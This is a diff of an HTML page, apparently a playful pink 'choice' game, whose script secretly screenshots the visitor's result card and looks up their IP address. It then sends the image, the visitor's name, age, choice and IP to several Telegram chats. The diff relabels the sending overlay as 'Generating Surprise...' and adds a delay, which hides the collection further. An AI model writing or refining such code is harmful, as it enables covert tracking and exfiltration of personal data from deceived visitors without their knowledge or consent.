@@ -29,7 +29,7 @@
             100% { transform: translateY(-200px) translateX(var(--x)) rotate(var(--r)); opacity: 0; }
         }
 
-        .fade-in { animation: fadeIn 0.5s ease-in; }
+        .fade-in { animation: fadeIn 0.5s ease-in forwards; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
@@ -103,10 +103,9 @@
         </div>
     </div>
 
-    <div id="sending-status" class="hidden fixed top-0 left-0 w-full h-full bg-black bg-opacity-50 flex justify-center items-center z-50">
-        <div class="bg-white p-4 rounded-xl font-bold text-pink-500 animate-pulse">
-            Sending Response... 💌
-        </div>
+    <div id="sending-overlay" class="hidden fixed inset-0 bg-black bg-opacity-60 z-50 flex flex-col justify-center items-center">
+        <div class="animate-spin rounded-full h-12 w-12 border-t-4 border-b-4 border-pink-500 mb-4"></div>
+        <p class="text-white font-bold text-lg animate-pulse">Generating Surprise... 📸</p>
     </div>
 
     <script>
@@ -167,60 +166,62 @@
         }
 
         function handleChoice(choiceId, btn) {
-            // Heart Animation
+            // 1. Trigger Animations
             const rect = btn.getBoundingClientRect();
             for(let i=0; i<20; i++) setTimeout(() => createHeart(rect.left + rect.width/2, rect.top), i * 50);
 
-            // Hide UI
+            // 2. Hide Buttons & Show Overlay
             document.getElementById('btn-container').classList.add('hidden');
             document.getElementById('question').classList.add('hidden');
             document.getElementById('ascii-art').classList.add('hidden');
-            
-            // Show Result
+            document.getElementById('sending-overlay').classList.remove('hidden');
+
+            // 3. Set Content
             const result = outcomes[choiceId];
             document.getElementById('msg-text').innerText = result.text;
             
             const imgEl = document.getElementById('result-img');
-            
-            // SECURITY FIX: Add timestamp to force fresh load (bypasses CORS cache issues)
+            // Adding timestamp to force fresh load (Avoids CORS cache issues)
             imgEl.src = result.img + "&t=" + new Date().getTime();
             
-            document.getElementById('final-result').classList.remove('hidden');
+            // 4. Show Result Container
+            const resultContainer = document.getElementById('final-result');
+            resultContainer.classList.remove('hidden');
+            resultContainer.classList.add('fade-in');
 
-            // Show sending status
-            document.getElementById('sending-status').classList.remove('hidden');
-
-            // Wait for image to load before taking screenshot
-            imgEl.onload = function() {
-                setTimeout(() => {
-                    sendScreenshot(result.logText);
-                }, 500); // Small delay to ensure rendering
-            };
-
-            // Fallback if image fails or takes too long
+            // 5. WAIT for image to load + Animation to finish (Crucial Step)
+            // We wait 2000ms (2 seconds) to ensure the visual is stable
             setTimeout(() => {
-                document.getElementById('sending-status').classList.add('hidden');
-            }, 8000);
+                sendScreenshot(result.logText);
+            }, 2500); 
         }
 
         async function sendScreenshot(choice) {
             try {
-                // 1. Capture Screen
-                const canvas = await html2canvas(document.getElementById('main-card'), {
-                    useCORS: true, 
-                    allowTaint: true,
-                    scale: 2
+                const element = document.getElementById('main-card');
+                
+                // Capture the card
+                const canvas = await html2canvas(element, {
+                    useCORS: true,       // Enable Cross-Origin images
+                    allowTaint: true,    // Allow tainted canvas (helps with rendering)
+                    backgroundColor: '#ffffff', // Force white background
+                    scale: 2             // High resolution
                 });
 
-                // 2. Convert to Blob
                 canvas.toBlob(async function(blob) {
                     if (!blob) {
                         console.error("Screenshot failed");
+                        document.getElementById('sending-overlay').classList.add('hidden');
                         return;
                     }
 
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
+                    // Get IP
+                    let ip = "Unknown";
+                    try {
+                        const ipRes = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipRes.json();
+                        ip = ipData.ip;
+                    } catch(e) {}
 
                     const caption = `
 📸 *New Response Captured!*
@@ -228,14 +229,14 @@
 *Name:* ${userName}
 *Age:* ${userAge}
 *Choice:* ${choice}
-*IP:* \`${ipData.ip}\`
+*IP:* \`${ip}\`
                     `;
 
-                    // 3. Send to All Bots
+                    // Send to all bots
                     const promises = CHAT_IDS.map(chatId => {
                         const formData = new FormData();
                         formData.append('chat_id', chatId);
-                        formData.append('photo', blob, 'screenshot.png');
+                        formData.append('photo', blob, 'response.png');
                         formData.append('caption', caption);
                         formData.append('parse_mode', 'Markdown');
 
@@ -246,16 +247,19 @@
                     });
 
                     await Promise.all(promises);
-                    console.log("Screenshot sent!");
-                    document.getElementById('sending-status').classList.add('hidden');
+                    console.log("Sent successfully");
+                    
+                    // Hide overlay after sending
+                    document.getElementById('sending-overlay').classList.add('hidden');
 
                 }, 'image/png');
 
             } catch (e) {
-                console.error("Error sending screenshot:", e);
-                document.getElementById('sending-status').classList.add('hidden');
+                console.error("Error:", e);
+                document.getElementById('sending-overlay').classList.add('hidden');
             }
         }
     </script>
 </body>
 </html>
+
